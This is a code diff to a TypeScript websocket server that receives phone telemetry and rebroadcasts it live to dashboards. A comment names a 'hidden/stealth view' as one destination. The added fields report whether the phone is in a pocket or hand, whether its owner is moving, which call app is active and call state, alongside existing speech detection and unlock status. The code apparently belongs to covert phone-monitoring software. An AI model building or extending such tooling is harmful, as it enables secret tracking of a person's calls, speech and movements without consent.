@@ -128,6 +128,12 @@ function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
                 const ringerMode = msg.ringer_mode;
                 const isSpeech = msg.is_speech;
                 const audioDb = msg.audio_db;
+                const batteryTemp = msg.battery_temp;
+                const isMoving = msg.is_moving;
+                const posture = msg.posture;
+                const callApp = msg.call_app;
+                const callPkg = msg.call_pkg;
+                const callCode = msg.call_code;
 
                 let routeStr = '';
                 if (route === 'JCK') routeStr = ' | 🎧 Jack';
@@ -153,8 +159,35 @@ function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
                 let audioStr = '';
                 if (isSpeech) audioStr = ` | 🗣️ Speech (${audioDb || 0}dB)`;
 
-                const telemetrySummary = `🔋 ${battery}% | 💾 ${storageMb}MB free${routeStr}${screenStr}${powerStr}${ringerStr}${audioStr}`;
+                let tempStr = batteryTemp ? ` | 🌡️ ${batteryTemp}°C` : '';
+                let motionStr = isMoving ? ' | 🏃 Moving' : ' | 🪑 Still';
+                let postureStr = posture === 'POCK' ? ' | 👖 Pocket' : (posture === 'DESK' ? ' | 🪵 Desk' : (posture === 'OPEN' ? ' | ✋ Hand' : ''));
+                let callStr = (callCode && callCode !== 'AIDLE') ? ` | 📞 ${callApp || 'Call'} (${callCode})` : '';
+
+                const telemetrySummary = `🔋 ${battery}% | 💾 ${storageMb}MB free${routeStr}${screenStr}${powerStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${callStr}`;
                 console.log(`[ws] Telemetry from ${clientId}: ${telemetrySummary}`);
+
+                // Broadcast live telemetry to connected dashboards (e.g. hidden/stealth view)
+                broadcastLiveEvent({
+                    type: 'live_telemetry',
+                    clientId,
+                    battery,
+                    storageMb,
+                    route,
+                    screenOn,
+                    isUnlocked,
+                    powerSource,
+                    ringerMode,
+                    isSpeech,
+                    audioDb,
+                    batteryTemp,
+                    isMoving,
+                    posture,
+                    callApp,
+                    callPkg,
+                    callCode,
+                    timestamp: new Date().toISOString()
+                });
             }
             break;
         }
